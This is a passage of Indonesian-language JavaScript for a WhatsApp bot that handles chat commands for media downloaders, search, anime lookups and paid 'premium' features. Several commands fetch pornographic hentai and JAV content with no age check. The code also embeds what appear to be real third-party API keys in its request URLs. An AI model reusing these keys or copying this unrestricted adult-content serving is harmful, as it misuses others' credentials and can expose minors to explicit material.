                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                   thumbnail: fs.readFileSync(`./media/diablo.png`)
                            })).imageMessage
                            buttonsMessage = {
                                   footerText: 'PROSES 5-15MENIT',
                                   imageMessage: imageMsg,
                                   contentText: `BAYAR DULU BIAR CEPAT DI PROSES`,
                                   buttons,
                                   headerType: 4
                            }
                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {
                                   quoted: ftoko
                            })
                            dha.relayWAMessage(prep)
                            break

                            //------------------< Sticker Cmd >-------------------
                     case 'addcmd':
                     case 'setcmd':
                            if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
                            if (isQuotedSticker) {
                                   if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                                   var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                                   addCmd(kodenya, q)
                                   textImg("Done!")
                            } else {
                                   reply('tag stickenya')
                            }
                            break
                     case 'delcmd':
                            if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
                            if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
                            var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                            _scommand.splice(getCommandPosition(kodenya), 1)
                            fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
                            textImg("Done!")
                            break
                     case 'listcmd':
                            let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
                            let cemde = [];
                            for (let i of _scommand) {
                                   cemde.push(i.id)
                                   teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
                            }
                            mentions(teksnyee, cemde, true)
                            break
                            //------------------< self and public >---------------------
                            //------------------< Downloader/Search/Anime >-------------------
                     case 'igdl':
                     case 'instagram':
                            try {
                                   if (!isUrl(q)) return reply('Linknya?')
                                   reply(mess.wait)
                                   res = await axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${setting.lolkey}&url=${args[0]}`)
                                   data = res.data.result
                                   for (let i = 0; i < data.media.length; i++) {
                                          sendMediaURL(from, data.media[i], data.caption, {
                                                 thumbnail: Buffer.alloc(0)
                                          })
                                   }
                            } catch (e) {
                                   console.log(e)
                                   reply(String(e))
                            }
                            break
                     case 'igdl2':
                     case 'instagram2':
                            try {
                                   if (!q) return reply('Linknya?')
                                   reply(mess.wait)
                                   res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=${setting.zekskey}&url=${args[0]}`)
                                   for (let i = 0; i < res.data.result.length; i++) {
                                          sendMediaURL(from, res.data.result[i].url, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM MEDIA*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${res.data.owner}\`\`\`
\`\`\`▢ Caption : ${res.data.caption}\`\`\``, {
                                                 thumbnail: Buffer.alloc(0)
                                          })
                                   }
                            } catch (e) {
                                   console.log(e)
                                   reply(String(e))
                            }
                            break
                     case 'igdl3':
                     case 'instagram3':
                            if (!q) return reply('Link Yang Mana? ')
                            if (!q.includes('instagram')) return reply(mess.error.Iv)
                            reply(mess.wait)
                            anu = await igDownloader(`${q}`)
                                   .then((data) => {
                                          sendMediaURL(from, data.result.link, data.result.desc, mek)
                                   })
                                   .catch((err) => {
                                          reply(String(err))
                                   })
                            break
                     case 'scplay':
                     case 'soundcloud':
                            if (!q) return reply('Link Yang Mana? ')
                            if (!q.includes('soundcloud')) return reply(mess.error.Iv)
                            reply(mess.wait)
                            anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=${setting.lolkey}&url=${q}`)
                                   .then((data) => {
                                          sendMediaURL(from, data.result, mek)
                                   })
                                   .catch((err) => {
                                          reply(String(err))
                                   })
                            break
                     case 'image':
                     case 'gimage':
                     case 'googleimage':
                            if (args.length < 1) return reply('Apa Yang Mau Dicari?')
                            reply(mess.wait)
                            teks = args.join(' ')
                            res = await googleImage(teks, google)

                            function google(error, result) {
                                   if (error) {
                                          return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')
                                   } else {
                                          gugIm = result
                                          random = gugIm[Math.floor(Math.random() * gugIm.length)].url
                                          sendFileFromUrl(random, image, {
                                                 quoted: mek,
                                                 caption: `*Hasil Pencarian Dari :* ${teks}`
                                          })
                                   }
                            }
                            break
                     case 'ytmp3':
                            if (!isPremium) return reply(mess.only.premium)
                            if (args.length < 1) return reply('Link Nya Mana?')
                            if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
                            teks = args.join(' ')
                            reply(mess.wait)
                            res = await y2mateA(teks).catch(e => {
                                   reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
                            })
                            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${res[0].judul}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

                            sendFileFromUrl(res[0].thumb, image, {
                                   caption: result,
                                   quoted: mek
                            }).then((lalu) => {
                                   sendFileFromUrl(res[0].link, document, {
                                          quoted: mek,
                                          mimetype: 'audio/mp3',
                                          filename: res[0].output
                                   })
                            })
                            break
                     case 'ytmp4':
                            if (!isPremium) return reply(mess.only.premium)
                            if (args.length < 1) return reply('Link Nya Mana?')
                            if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
                            teks = args.join(' ')
                            reply(mess.wait)
                            res = await y2mateV(teks).catch(e => {
                                   reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
                            })
                            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${res[0].judul}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

                            sendFileFromUrl(res[0].thumb, image, {
                                   caption: result,
                                   quoted: mek
                            }).then((lalu) => {
                                   sendFileFromUrl(res[0].link, video, {
                                          quoted: mek,
                                          mimetype: 'video/mp4',
                                          filename: res[0].output
                                   })
                            })
                            break
                     case 'ytmp4hd':
                     case 'ythd':
                            if (!isPremium) return reply(mess.only.premium)
                            if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)
                            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
                            if (!isLinkks2) return reply(mess.error.Iv)
                            try {
                                   reply(mess.wait)
                                   ythd(args[0])
                                          .then((res) => {
                                                 const {
                                                        dl_link,
                                                        thumb,
                                                        title,
                                                        filesizeF,
                                                        filesize
                                                 } = res
                                                 axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                                        .then((a) => {
                                                               if (Number(filesize) >= 40000) return sendMediaURL(from, thumb,
                                                                      `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Kualitas* : 720p\`\`\`
\`\`\`▢ Size* : ${filesizeF}\`\`\`
\`\`\`▢ Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

                                                               const captionsYtmp4 =
                                                                      `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Kualitas : 720p\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

                                                               sendMediaURL(from, thumb, captionsYtmp4)
                                                               sendMediaURL(from, dl_link, `nih kak`).catch(() => reply(mess.error.api))
                                                        })
                                          })
                            } catch (err) {
                                   reply(`eror`)
                            }
                            break
                     case 'google':
                            if (!q) return reply(mess.wrongFormat)
                            ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=f3fce33fa6804c0b97c897b3bd2ec7a8&url=https://google.com/search?q=${q}`)
                            reply(mess.wait)
                            if (q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
                            googleIt({
                                   'query': q
                            }).then(results => {
                                   vars = `_*Hasil Pencarian : ${q}*_\n`
                                   for (let i = 0; i < results.length; i++) {
                                          vars += `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
                                   }
                                   dha.sendMessage(from, ss, image, {
                                          caption: vars,
                                          quoted: mek
                                   })
                            }).catch(e => {
                                   console.log(e)
                                   reply(`${e}`)
                            })
                            break
                     case 'mediafire':
                            if (!isPremium) return reply(mess.only.premium)
                            if (args.length < 1) return reply('Link Nya Mana? ')
                            if (!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
                            reply(mess.wait)
                            teks = args.join(' ')
                            res = await mediafireDl(teks)
                            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Nama : ${res[0].nama}\`\`\`
\`\`\`▢ Ukuran : ${res[0].size}\`\`\`
\`\`\`▢ Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
                            reply(result)
                            sendFileFromUrl(res[0].link, document, {
                                   mimetype: res[0].mime,
                                   filename: res[0].nama,
                                   quoted: mek
                            })
                            break
                     case 'tiktok':
                     case 'ttdl':
                            if (!q) return reply('Linknya?')
                            if (!q.includes('tiktok')) return reply(mess.error.Iv)
                            reply(mess.wait)
                            anu = await TiktokDownloader(`${q}`)
                                   .then((data) => {
                                          sendMediaURL(from, data.result.watermark)
                                   })
                                   .catch((err) => {
                                          reply(String(err))
                                   })
                            break
                     case 'ttnowm':
                     case 'tiktoknowm':
                            if (!q) return reply('Linknya?')
                            if (!q.includes('tiktok')) return reply(mess.error.Iv)
                            reply(mess.wait)
                            anu = await TiktokDownloader(`${q}`)
                                   .then((data) => {
                                          sendMediaURL(from, data.result.nowatermark)
                                   })
                                   .catch((err) => {
                                          reply(String(err))
                                   })
                            break
                     case 'tiktok':
                            if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dha-chan02.github.io`)
                            if (!q) return reply('Linknya?')
                            if (!q.includes('tiktok')) return reply(mess.error.Iv)
                            buttons = [{
                                   buttonId: `${prefix}tiktoknowm ${q}`,
                                   buttonText: {
                                          displayText: `🎥 Video`
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}ttaudio ${q}`,
                                   buttonText: {
                                          displayText: '🎵 Mp3'
                                   },
                                   type: 1
                            }]
                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                   thumbnail: fs.readFileSync(`./media/diablo.png`)
                            })).imageMessage
                            buttonsMessage = {
                                   footerText: 'Jangan Lupa Subscribe Yt NOIR BOT\n Helpme tu 1k subscriber',
                                   imageMessage: imageMsg,
                                   contentText: `Silahkan pilihan media yg mau di download kak:v`,
                                   buttons,
                                   headerType: 4
                            }
                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {
                                   quoted: mek
                            })
                            dha.relayWAMessage(prep)
                            break
                     case 'ttaudio':
                     case 'tiktokmusic':
                     case 'tiktokaudio':
                            if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                            ini_link = args[0]
                            get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${setting.lolkey}&url=${ini_link}`)
                            dha.sendMessage(from, get_audio, audio, {
                                   mimetype: Mimetype.mp4Audio,
                                   quoted: mek
                            })
                            break
                     case 'fb':
                     case 'facebook':
                            if (!q) return
                            reply(mess.wait)
                            try {
                                   anu = await fetchJson(`https://zenzapi.xyz/api/downloader/facebook?url=${args[0]}&apikey=0963ec745dde`)
                                   sendMediaURL(from, anu.result.hd)
                            } catch (e) {
                                   console.log(e)
                                   reply(`${e}`)
                            }
                            break
                     case 'twitter':
                            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
                            if (!q) return reply('Linknya?')
                            ten = args[0]
                            var res = await twitterGetUrl(`${ten}`)
                                   .then(g => {
                                          ren = `${g.download[2].url}`
                                          sendMediaURL(from, ren, 'Done')
                                   })
                            break
                     case 'brainly':
                            brainly(args.join(" ")).then(res => {
                                   hmm = '────────────\n'
                                   for (let Y of res.data) {
                                          hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
                                   }
                                   reply(hmm)
                                   console.log(res)
                            })
                            break
                     case 'ssweb':
                            if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
                            ini_link = args[0]
                            ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${setting.lolkey}&url=${ini_link}`)
                            await dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek
                            })
                            break
                     case 'nhentaipdf':
                            if (!isPremium) return reply(mess.only.premium)
                            if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
                            if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
                            try {
                                   henid = args[0]
                                   get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
                                   get_result = get_result.result
                                   get_info = get_result.info
                                   teks = `\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
                                   ini_image = await getBuffer(get_result.image[0])
                                   dha.sendMessage(from, ini_image, image, {
                                          caption: teks,
                                          quoted: mek
                                   })
                                   anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${setting.lolkey}`)
                                   pdf = await getBuffer(anu.result)
                                   dha.sendMessage(from, pdf, document, {
                                          quoted: mek,
                                          mimetype: Mimetype.pdf,
                                          filename: `${get_result.title_romaji}.pdf`,
                                          thumbnail: ini_image
                                   })
                            } catch (e) {
                                   console.log(e)
                                   reply(String(e))
                            }
                            break
                     case 'nhentai':
                            if (!isPremium) return reply(mess.only.premium)
                            if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                            reply(mess.wait)
                            henid = args[0]
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                            ini_txt += `Title Native : ${get_result.title_native}\n`
                            ini_txt += `Read Online : ${get_result.read}\n`
                            get_info = get_result.info
                            ini_txt += `Parodies : ${get_info.parodies}\n`
                            ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                            ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                            ini_txt += `Artist : ${get_info.artists}\n`
                            ini_txt += `Group : ${get_info.groups}\n`
                            ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                            ini_txt += `Categories : ${get_info.categories}\n`
                            ini_txt += `Pages : ${get_info.pages}\n`
                            ini_txt += `Uploaded : ${get_info.uploaded}\n`
                            reply(ini_txt)
                            break
                     case 'manga':
                            if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                            reply(mess.wait)
                            query = args.join(" ")
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${setting.lolkey}&query=${query}`)
                            get_result = get_result.result
                            ini_txt = `Id : ${get_result.id}\n`
                            ini_txt += `Id MAL : ${get_result.idMal}\n`
                            ini_txt += `Title : ${get_result.title.romaji}\n`
                            ini_txt += `English : ${get_result.title.english}\n`
                            ini_txt += `Native : ${get_result.title.native}\n`
                            ini_txt += `Format : ${get_result.format}\n`
                            ini_txt += `Chapters : ${get_result.chapters}\n`
                            ini_txt += `Volume : ${get_result.volumes}\n`
                            ini_txt += `Status : ${get_result.status}\n`
                            ini_txt += `Source : ${get_result.source}\n`
                            ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                            ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                            ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                            ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                            ini_txt += `Score : ${get_result.averageScore}%\n`
                            ini_txt += `Characters : \n`
                            ini_character = get_result.characters.nodes
                            for (var x of ini_character) {
                                   ini_txt += `- ${x.name.full} (${x.name.native})\n`
                            }
                            ini_txt += `\nDescription : ${get_result.description}`
                            thumbnail = await getBuffer(get_result.coverImage.large)
                            await dha.sendMessage(from, thumbnail, image, {
                                   quoted: mek,
                                   caption: ini_txt
                            })
                            break
                     case 'doujindesu':
                            if (!q) return reply(mess.wrongFormat)
                            reply(mess.wait)
                            try {
                                   doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
                                   let {
                                          data
                                   } = await doujinnya
                                   xixixai = `*Doujindesu Search*\n`
                                   for (let i = 0; i < data.length; i++) {
                                          xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
                                   }
                                   buffer = await getBuffer(data[0].thumb)
                                   dha.sendMessage(from, buffer, image, {
                                          caption: xixixai,
                                          quoted: mek
                                   })
                            } catch (e) {
                                   console.log(e)
                                   reply(String(e))
                            }
                            break
                     case 'anime':
                            if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                            reply(mess.wait)
                            query = args.join(" ")
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${setting.lolkey}&query=${query}`)
                            get_result = get_result.result
                            ini_txt = `Id : ${get_result.id}\n`
                            ini_txt += `Id MAL : ${get_result.idMal}\n`
                            ini_txt += `Title : ${get_result.title.romaji}\n`
                            ini_txt += `English : ${get_result.title.english}\n`
                            ini_txt += `Native : ${get_result.title.native}\n`
                            ini_txt += `Format : ${get_result.format}\n`
                            ini_txt += `Episodes : ${get_result.episodes}\n`
                            ini_txt += `Duration : ${get_result.duration} mins.\n`
                            ini_txt += `Status : ${get_result.status}\n`
                            ini_txt += `Season : ${get_result.season}\n`
                            ini_txt += `Season Year : ${get_result.seasonYear}\n`
                            ini_txt += `Source : ${get_result.source}\n`
                            ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                            ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                            ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                            ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                            ini_txt += `Score : ${get_result.averageScore}%\n`
                            ini_txt += `Characters : \n`
                            ini_character = get_result.characters.nodes
                            for (var x of ini_character) {
                                   ini_txt += `- ${x.name.full} (${x.name.native})\n`
                            }
                            ini_txt += `\nDescription : ${get_result.description}`
                            thumbnail = await getBuffer(get_result.coverImage.large)
                            await dha.sendMessage(from, thumbnail, image, {
                                   quoted: mek,
                                   caption: ini_txt
                            })
                            break
                     case 'kusonime':
                            if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                            reply(mess.wait)
                            query = args.join(" ")
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${setting.lolkey}&query=${query}`)
                            get_result = get_result.result
                            ini_txt = `Title : ${get_result.title}\n`
                            ini_txt += `Japanese : ${get_result.japanese}\n`
                            ini_txt += `Genre : ${get_result.genre}\n`
                            ini_txt += `Seasons : ${get_result.seasons}\n`
                            ini_txt += `Producers : ${get_result.producers}\n`
                            ini_txt += `Type : ${get_result.type}\n`
                            ini_txt += `Status : ${get_result.status}\n`
                            ini_txt += `Total Episode : ${get_result.total_episode}\n`
                            ini_txt += `Score : ${get_result.score}\n`
                            ini_txt += `Duration : ${get_result.duration}\n`
                            ini_txt += `Released On : ${get_result.released_on}\n`
                            ini_txt += `Desc : ${get_result.desc}\n`
                            link_dl = get_result.link_dl
                            for (var x in link_dl) {
                                   ini_txt += `\n${x}\n`
                                   for (var y in link_dl[x]) {
                                          ini_txt += `${y} - ${link_dl[x][y]}\n`
                                   }
                            }
                            ini_buffer = await getBuffer(get_result.thumbnail)
                            await dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek,
                                   caption: ini_txt
                            })
                            break
                     case 'otakudesu':
                            if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                            reply(mess.wait)
                            query = args.join(" ")
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${setting.lolkey}&query=${query}`)
                            get_result = get_result.result
                            ini_txt = `Title : ${get_result.title}\n`
                            ini_txt += `Japanese : ${get_result.japanese}\n`
                            ini_txt += `Judul : ${get_result.judul}\n`
                            ini_txt += `Type : ${get_result.type}\n`
                            ini_txt += `Episode : ${get_result.episodes}\n`
                            ini_txt += `Aired : ${get_result.aired}\n`
                            ini_txt += `Producers : ${get_result.producers}\n`
                            ini_txt += `Genre : ${get_result.genres}\n`
                            ini_txt += `Duration : ${get_result.duration}\n`
                            ini_txt += `Studios : ${get_result.status}\n`
                            ini_txt += `Rating : ${get_result.rating}\n`
                            ini_txt += `Credit : ${get_result.credit}\n`
                            get_link = get_result.link_dl
                            for (var x in get_link) {
                                   ini_txt += `\n\n*${get_link[x].title}*\n`
                                   for (var y in get_link[x].link_dl) {
                                          ini_info = get_link[x].link_dl[y]
                                          ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                                          ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                                          ini_txt += `\`\`\`Link : \`\`\`\n`
                                          down_link = ini_info.link_dl
                                          for (var z in down_link) {
                                                 ini_txt += `${z} - ${down_link[z]}\n`
                                          }
                                   }
                            }
                            reply(ini_txt)
                            break
                     case 'nekopoi':
                            if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                            ini_url = args[0]
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${setting.lolkey}&url=${ini_url}`)
                            get_result = get_result.result
                            ini_txt = `\`\`\`▢ Title : ${get_result.anime}\`\`\`\n`
                            ini_txt += `\`\`\`▢ Porducers : ${get_result.producers}\`\`\`\n`
                            ini_txt += `\`\`\`▢ Duration : ${get_result.duration}\`\`\`\n`
                            ini_txt += `\`\`\`▢ Size : ${get_result.size}\`\`\`\n`
                            ini_txt += `\`\`\`▢ Sinopsis : ${get_result.sinopsis}\`\`\`\n`
                            link = get_result.link
                            for (var x in link) {
                                   ini_txt += `\n${link[x].name}\n`
                                   link_dl = link[x].link
                                   for (var y in link_dl) {
                                          ini_txt += `${y} - ${link_dl[y]}\n`
                                   }
                            }
                            ini_buffer = await getBuffer(get_result.thumb)
                            await dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek,
                                   caption: ini_txt
                            })
                            break
                     case 'nekopoisearch':
                            if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                            query = args.join(" ")
                            get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${setting.lolkey}&query=${query}`)
                            get_result = get_result.result
                            ini_txt = ""
                            for (var x of get_result) {
                                   ini_txt += `\`\`\`▢ Title : ${x.title}\`\`\`\n`
                                   ini_txt += `\`\`\`▢ Link : ${x.link}\`\`\`\n`
                                   ini_txt += `\`\`\`▢ Thumbnail : ${x.thumbnail}\`\`\`\n\n`
                            }
                            reply(ini_txt)
                            break
                     case 'neko':
                     case 'kanna':
                     case 'sagiri':
                     case 'megumin':
                     case 'wallnime':
                            reply(mess.wait)
                            getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`).then((gambar) => {
                                   dha.sendMessage(from, gambar, image, {
                                          quoted: mek,
                                          thumbnail: Buffer.alloc(0)
                                   })
                            })
                            break

                     case 'hentai':
                            getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${setting.lolkey}`).then((gambar) => {
                                   dha.sendMessage(from, gambar, image, {
                                          quoted: mek
                                   })
                            })
                            break
                     case 'storyanime':
                            reply(mess.wait)
                            anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=${setting.lolkey}`)
                            buffer = await getBuffer(anu.result)
                            dha.sendMessage(from, buffer, video, {
                                   quoted: mek
                            })
                            break
                     case 'nekopoi3d':
                     case '3dnekopoi':
                     case '3dnekopoilast':
                            reply(mess.wait)
                            try {
                                   bsangee = await axios.get(`https://api.vhtear.com/neko3d&apikey=${setting.vhtearkey}`)
                                   bsangee2 = bsangee.data
                                   keluarplay = `*List update 3D JAV*\n`
                                   for (let i = 0; i < bsangee2.result.length; i++) {
                                          keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`
                                   }
                                   reply(keluarplay)
                            } catch (err) {
                                   console.log(err)
                                   reply('error!')
                            }
                            break
                     case 'nekopoijav':
                     case 'javnekopoi':
                            reply(mess.wait)
                            try {
                                   bsangce = await axios.get(`https://api.vhtear.com/nekojavlist&apikey=${setting.vhtearkey}`)
                                   bsangce2 = bsangce.data
                                   keluarplay = `*List update JAV*\n`
                                   for (let i = 0; i < bsangce2.result.length; i++) {
                                          keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`
                                   }
                                   reply(keluarplay)
                            } catch (err) {
                                   console.log(err)
                            }
                            break
                     case 'nekopoicosplay':
                     case 'cosplaynekopoi':
                            try {
                                   reply(mess.wait)
                                   bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=${setting.vhtearkey}`)
                                   bsangbe2 = bsangbe.data
                                   keluarplay = `*List update Cosplay JAV*\n`
                                   for (let i = 0; i < bsangbe2.result.length; i++) {
                                          keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
                                   }
                                   reply(keluarplay)
                            } catch (err) {
                                   console.log(err)
                            }
                            break
                     case 'otakuongoing':
                            o = await onGoing()
                            console.log(o)
                            ot = '*「 Ongoing Otakudesu 」*'
                            for (let i = 0; i < o.length; i++) {
                                   ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
                            }
                            buff = await getBuffer(o[0].thumb)
                            dha.sendMessage(from, buff, image, {
                                   quoted: mek,
                                   caption: ot
                            })
                            break
                     case 'waifu':

                            v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
                            inifile = sendMediaURL(from, v.url, )
                            buttons = [{
                                   buttonId: `${prefix + command}`,
                                   buttonText: {
                                          displayText: `➡️Next`
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}nhentaibot`,
                                   buttonText: {
                                          displayText: 'NHENTAI BOT'
                                   },
                                   type: 1
                            }]
                            imageMsg = (await dha.prepareMessage(from, inifile, 'imageMessage', {
                                   thumbnail: Buffer.alloc(0)
                            })).message.imageMessage
                            buttonsMessage = {
                                   footerText: 'Jangan Lupa Donasi Ya Kak ☕',
                                   imageMessage: imageMsg,
                                   contentText: `klik Next untuk ke gambar selanjut nya`,
                                   buttons,
                                   headerType: 4
                            }
                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {
                                   quoted: mek
                            })
                            dha.relayWAMessage(prep)
                            fs.unlinkSync(`./${sender}.jpeg`)
                            break
                     case 'loli':
                     case 'husbu':
                     case 'milf':
                     case 'cosplay':
                     case 'wallml':
